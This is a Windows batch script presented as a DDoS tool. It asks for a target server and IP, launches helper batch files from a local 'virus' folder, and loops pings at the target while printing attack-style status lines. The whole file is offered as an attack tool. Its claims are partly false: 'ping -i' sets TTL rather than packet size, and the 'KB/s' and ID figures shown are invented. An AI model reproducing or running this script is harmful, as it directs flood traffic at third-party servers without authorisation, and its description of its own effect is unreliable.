@echo off
color 0a
mode 98,17
title DDOS Attack By $LH$CK
cls
start c:\Users\Ari\virus\net.bat
timeout /t 1 /nobreak >nul
start C:\Users\Ari\virus\title-no-connection.bat
echo ==================================================================================================
echo                                DDOS Attack With %random% By $LH$CK
echo ==================================================================================================
echo.
set /p server=Server: 
echo.
echo ==================================================================================================
echo.
ping -n 1 %server%
echo.
echo ==================================================================================================
goto NEXT
:NEXT
set /p ip_server=IP Server: 
echo.
echo Max Packet Size : 255
set /p packet=Packet Size: 
echo.
echo ==================================================================================================
echo                                       Alert DDOS Starting
echo ==================================================================================================
echo.
start C:\Users\Ari\virus\ddos-attack-one.bat
timeout /t 1 /nobreak >nul
start C:\Users\Ari\virus\ddos-attack-two.bat
timeout /t 1 /nobreak >nul
set /a nilaiawal=1
set /a nilaiakhir=86400
:DDOS
ping -n 1 google.com >nul
if errorlevel 1 (
    timeout /t 1 /nobreak >nul
    echo Failed to request, Connection Lost
    goto DDOS
)
:connection
if %nilaiawal% leq %nilaiakhir% (
    set /a nilaiawal=%nilaiawal%+1
    echo Attacki_Server : %server% Packet_Size : %packet% KB/s Icmp_Seq : %nilaiawal% ID_Server : [%random%]
    ping -i %packet% -n 1 %ip_server% >nul
    goto DDOS
)